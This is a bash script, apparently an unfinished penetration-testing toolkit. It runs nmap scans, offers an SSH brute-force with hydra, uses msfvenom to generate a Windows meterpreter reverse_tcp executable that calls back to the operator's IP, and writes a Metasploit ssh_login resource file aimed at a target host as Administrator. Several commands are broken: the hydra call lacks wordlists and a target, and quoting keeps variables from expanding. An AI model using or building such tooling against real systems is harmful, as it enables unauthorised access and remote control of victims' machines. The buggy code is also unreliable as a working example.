#!/bin/bash

# Part 1
read -p "[*]Enter the IP/CIDR you want to scan: " IP_NETWORK
read -p "[*]Enter the directory for the output files: " OUTPUT_DIR

CURRENT_DIR=$(echo pwd)
mkdir $OUTPUT_DIR
echo $IP_NETWORK

echo -e "Choose the scan:\n1) Basic Scan for TCP\n2) Full Scan for TCP\n3) Exit"
read SCAN_MODE

case $SCAN_MODE in
    1)
        nmap $IP_NETWORK -Pn -sV -p22 -oN basic_scan.txt
    ;;
    2)
        sudo nmap $IP_NETWORK -O -sV -Pn -p- -oN full_scan.txt
    ;;
    3)
        exit
    ;;
esac

# Part 2
echo -e "Choose which attack you prefer:\n1) Test Weak Credentials\n2) Generate Payload\n3) Exit"
read ATTACK_MODE

case $ATTACK_MODE in
    1)
        hydra -L -P ssh -vv
    ;;
    2)
        cd OUTPUT
        ATTACKER_IP=$(ifconfig | grep broadcast | tail -n 1 | awk '{print $2}')
        read -p "Specify the listening port on your machine: " ATTACKER_PORT
        msfvenom -p windows/meterpreter/reverse_tcp lhost=$ATTACKER_IP lport=$ATTACKER_PORT -f exe -o rev$ATTACKER_PORT.exe
    ;;
    3)
        exit
    ;;
esac

# Part 3
#get password list via 1) built-in list 2) seclists 3) user spcified download

# Part 4
read -p "Enter Target IP: " TARGET_IP
cd OUTPUT
touch ssh_scanner.rc
echo 'use auxiliary/scanner/ssh/ssh_login' >> ssh_scanner.rc
echo 'set rhosts $TARGET_IP' >> ssh_scanner.rc
echo 'set pass_file password.lst' >> ssh_scanner.rc
echo 'set username Administrator' >> ssh_scanner.rc
